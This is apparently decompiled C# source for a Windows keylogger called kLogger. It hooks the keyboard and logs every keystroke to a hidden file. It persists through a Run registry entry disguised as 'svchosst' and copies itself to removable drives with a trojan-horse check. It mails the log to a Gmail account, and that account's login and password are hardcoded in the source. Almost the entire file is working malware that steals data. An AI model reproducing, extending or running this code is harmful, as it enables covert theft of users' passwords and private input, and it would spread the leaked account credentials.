using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using keyboardhook;

namespace kLogger;

public class Form1 : Form
{
	private const string MYNAME = "klg";

	private IContainer components = null;

	private Timer timer1;

	private Timer tmrMail;

	private static string KEYLOGFILE = Application.get_ExecutablePath().Substring(0, Application.get_ExecutablePath().LastIndexOf('\\') + 1) + "kl.tmp";

	private static TextWriter tWriter = null;

	private Replication kLogReplicator = new Replication();

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		tmrMail = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.set_Interval(10);
		timer1.add_Tick((EventHandler)timer1_Tick);
		tmrMail.set_Interval(3600000);
		tmrMail.add_Tick((EventHandler)tmrMail_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(115, 29));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string location = Assembly.GetExecutingAssembly().Location;
		if (kLogReplicator.IsThisTrojanHorse(location))
		{
			kLogReplicator.RetieveEXE(location, "klg");
			Application.Exit();
			return;
		}
		string[] commandLineArgs = Environment.GetCommandLineArgs();
		if (commandLineArgs != null && commandLineArgs.Length > 1 && !kLogReplicator.BreakAction(commandLineArgs[1]))
		{
			Environment.Exit(1);
		}
		RegStartUp();
		StartKeyLogger();
		StartReplicationService();
		SendMail();
	}

	private void StartKeyLogger()
	{
		timer1.set_Enabled(true);
		tmrMail.set_Enabled(true);
		tWriter = new StreamWriter(KEYLOGFILE, append: true);
		tWriter.WriteLine("\r\n\r\n-------> Startling Log - {0} <--------", DateTime.Now.ToString());
		tWriter.Close();
		Hook.CreateHook(KeyReaderr);
	}

	public void KeyReaderr(IntPtr wParam, IntPtr lParam)
	{
		int num = Marshal.ReadInt32(lParam);
		Hook.VK vK = (Hook.VK)num;
		string text = "";
		switch (vK)
		{
		case Hook.VK.VK_OPBRACKET:
			text = "[";
			break;
		case Hook.VK.VK_BACKSLASH:
			text = "\\";
			break;
		case Hook.VK.VK_CLBRACKET:
			text = "]";
			break;
		case Hook.VK.VK_QUOTE:
			text = "'";
			break;
		case Hook.VK.VK_BACK:
			text = "<-backspace->";
			break;
		case Hook.VK.VK_TAB:
			text = "<-tab->";
			break;
		case Hook.VK.VK_RETURN:
			text = "\r\n";
			break;
		case Hook.VK.VK_PAUSE:
			text = "<-pause->";
			break;
		case Hook.VK.VK_CAPITAL:
			text = "<-caps lock->";
			break;
		case Hook.VK.VK_ESCAPE:
			text = "<-esc->";
			break;
		case Hook.VK.VK_SPACE:
			text = " ";
			break;
		case Hook.VK.VK_PRIOR:
			text = "<-page up->";
			break;
		case Hook.VK.VK_NEXT:
			text = "<-page down->";
			break;
		case Hook.VK.VK_END:
			text = "<-end->";
			break;
		case Hook.VK.VK_HOME:
			text = "<-home->";
			break;
		case Hook.VK.VK_LEFT:
			text = "<-arrow left->";
			break;
		case Hook.VK.VK_UP:
			text = "<-arrow up->";
			break;
		case Hook.VK.VK_RIGHT:
			text = "<-arrow right->";
			break;
		case Hook.VK.VK_DOWN:
			text = "<-arrow down->";
			break;
		case Hook.VK.VK_SNAPSHOT:
			text = "<-print screen->";
			break;
		case Hook.VK.VK_INSERT:
			text = "<-insert->";
			break;
		case Hook.VK.VK_DELETE:
			text = "<-delete->";
			break;
		case Hook.VK.VK_0:
			text = "0";
			break;
		case Hook.VK.VK_1:
			text = "1";
			break;
		case Hook.VK.VK_2:
			text = "2";
			break;
		case Hook.VK.VK_3:
			text = "3";
			break;
		case Hook.VK.VK_4:
			text = "4";
			break;
		case Hook.VK.VK_5:
			text = "5";
			break;
		case Hook.VK.VK_6:
			text = "6";
			break;
		case Hook.VK.VK_7:
			text = "7";
			break;
		case Hook.VK.VK_8:
			text = "8";
			break;
		case Hook.VK.VK_9:
			text = "9";
			break;
		case Hook.VK.VK_A:
			text = "a";
			break;
		case Hook.VK.VK_B:
			text = "b";
			break;
		case Hook.VK.VK_C:
			text = "c";
			break;
		case Hook.VK.VK_D:
			text = "d";
			break;
		case Hook.VK.VK_E:
			text = "e";
			break;
		case Hook.VK.VK_F:
			text = "f";
			break;
		case Hook.VK.VK_G:
			text = "g";
			break;
		case Hook.VK.VK_H:
			text = "h";
			break;
		case Hook.VK.VK_I:
			text = "i";
			break;
		case Hook.VK.VK_J:
			text = "j";
			break;
		case Hook.VK.VK_K:
			text = "k";
			break;
		case Hook.VK.VK_L:
			text = "l";
			break;
		case Hook.VK.VK_M:
			text = "m";
			break;
		case Hook.VK.VK_N:
			text = "n";
			break;
		case Hook.VK.VK_O:
			text = "o";
			break;
		case Hook.VK.VK_P:
			text = "p";
			break;
		case Hook.VK.VK_Q:
			text = "q";
			break;
		case Hook.VK.VK_R:
			text = "r";
			break;
		case Hook.VK.VK_S:
			text = "s";
			break;
		case Hook.VK.VK_T:
			text = "t";
			break;
		case Hook.VK.VK_U:
			text = "u";
			break;
		case Hook.VK.VK_V:
			text = "v";
			break;
		case Hook.VK.VK_W:
			text = "w";
			break;
		case Hook.VK.VK_X:
			text = "x";
			break;
		case Hook.VK.VK_Y:
			text = "y";
			break;
		case Hook.VK.VK_Z:
			text = "z";
			break;
		case Hook.VK.VK_WINDOW:
		case Hook.VK.VK_WINDOW2:
			text = "<-window->";
			break;
		case Hook.VK.VK_BTNRTCLICK:
			text = "<-btn right click->";
			break;
		case Hook.VK.VK_NUMPAD0:
			text = "0";
			break;
		case Hook.VK.VK_NUMPAD1:
			text = "1";
			break;
		case Hook.VK.VK_NUMPAD2:
			text = "2";
			break;
		case Hook.VK.VK_NUMPAD3:
			text = "3";
			break;
		case Hook.VK.VK_NUMPAD4:
			text = "4";
			break;
		case Hook.VK.VK_NUMPAD5:
			text = "5";
			break;
		case Hook.VK.VK_NUMPAD6:
			text = "6";
			break;
		case Hook.VK.VK_NUMPAD7:
			text = "7";
			break;
		case Hook.VK.VK_NUMPAD8:
			text = "8";
			break;
		case Hook.VK.VK_NUMPAD9:
			text = "9";
			break;
		case Hook.VK.VK_MULT:
			text = "*";
			break;
		case Hook.VK.VK_PLUS:
			text = "+";
			break;
		case Hook.VK.VK_SEPERATOR:
			text = "|";
			break;
		case Hook.VK.VK_SUBTRACT:
			text = "-";
			break;
		case Hook.VK.VK_NPDECIMAL:
			text = ".";
			break;
		case Hook.VK.VK_NPDIVIDE:
			text = "/";
			break;
		case Hook.VK.VK_F1:
			text = "<-F1->";
			break;
		case Hook.VK.VK_F2:
			text = "<-F2->";
			break;
		case Hook.VK.VK_F3:
			text = "<-F3->";
			break;
		case Hook.VK.VK_F4:
			text = "<-F4->";
			break;
		case Hook.VK.VK_F5:
			text = "<-F5->";
			break;
		case Hook.VK.VK_F6:
			text = "<-F6->";
			break;
		case Hook.VK.VK_F7:
			text = "<-F7->";
			break;
		case Hook.VK.VK_F8:
			text = "<-F8->";
			break;
		case Hook.VK.VK_F9:
			text = "<-F9->";
			break;
		case Hook.VK.VK_F10:
			text = "<-F10->";
			break;
		case Hook.VK.VK_F11:
			text = "<-F11->";
			break;
		case Hook.VK.VK_F12:
			text = "<-F12->";
			break;
		case Hook.VK.VK_NUMLOCK:
			text = "<-numlock->";
			break;
		case Hook.VK.VK_SCROLL:
			text = "<-scroll>";
			break;
		case Hook.VK.VK_LSHIFT:
			text = "<-left shift->";
			break;
		case Hook.VK.VK_RSHIFT:
			text = "<-right shift->";
			break;
		case Hook.VK.VK_LCONTROL:
			text = "<-left control->";
			break;
		case Hook.VK.VK_RCONTROL:
			text = "<-right control->";
			break;
		case Hook.VK.VK_LALT:
			text = "<-left alt->";
			break;
		case Hook.VK.VK_RALT:
			text = "<-right alt->";
			break;
		default:
			text = "KK-" + vK;
			break;
		case Hook.VK.VK_SEMICOLON:
			text = ";";
			break;
		case Hook.VK.VK_EQUAL:
			text = "=";
			break;
		case Hook.VK.VK_COMMA:
			text = ",";
			break;
		case Hook.VK.VK_SUB:
			text = "-";
			break;
		case Hook.VK.VK_DECIMAL:
			text = ".";
			break;
		case Hook.VK.VK_DIVIDE:
			text = "/";
			break;
		case Hook.VK.VK_COM:
			text = "`";
			break;
		}
		WriteToFile(text);
	}

	private static void WriteToFile(string str)
	{
		try
		{
			tWriter = new StreamWriter(KEYLOGFILE, append: true);
			tWriter.Write(str);
			tWriter.Close();
			tWriter = null;
		}
		catch
		{
		}
	}

	private void RegStartUp()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		try
		{
			if (registryKey.GetValue("svchosst") == null)
			{
				registryKey.SetValue("svchosst", Application.get_ExecutablePath().ToString());
			}
		}
		catch (Exception ex)
		{
			WriteToFile("\r\n\r\n---> Registry Access Denied! Error: " + ex.Message + "<---\r\n");
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		((Control)this).Hide();
		timer1.set_Interval(3600000);
		WriteToFile("\r\n--->" + DateTime.Now.ToShortTimeString() + "<---\r\n");
	}

	private void SendMail()
	{
		string subject = "kLog - " + SystemInformation.get_UserName();
		string text = File.ReadAllText(KEYLOGFILE);
		if (text.Length < 101000)
		{
			tmrMail.set_Enabled(false);
			return;
		}
		try
		{
			MailMessage message = new MailMessage("rockroxx@gmail.com", "rockroxx@gmail.com", subject, text);
			SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
			smtpClient.EnableSsl = true;
			NetworkCredential credentials = new NetworkCredential("rockroxx", "hitech55");
			smtpClient.UseDefaultCredentials = false;
			smtpClient.Credentials = credentials;
			smtpClient.Send(message);
			tmrMail.set_Enabled(false);
			File.Delete(KEYLOGFILE);
		}
		catch (Exception ex)
		{
			WriteToFile("\r\n\r\n ---> Mail Failed! Error:" + ex.Message + "<---\r\n");
		}
	}

	private void tmrMail_Tick(object sender, EventArgs e)
	{
		SendMail();
	}

	private void StartReplicationService()
	{
		Thread.Sleep(60000);
		Thread thread = new Thread(kLogReplicator.DetectRemovableDrive);
		thread.Start();
	}
}
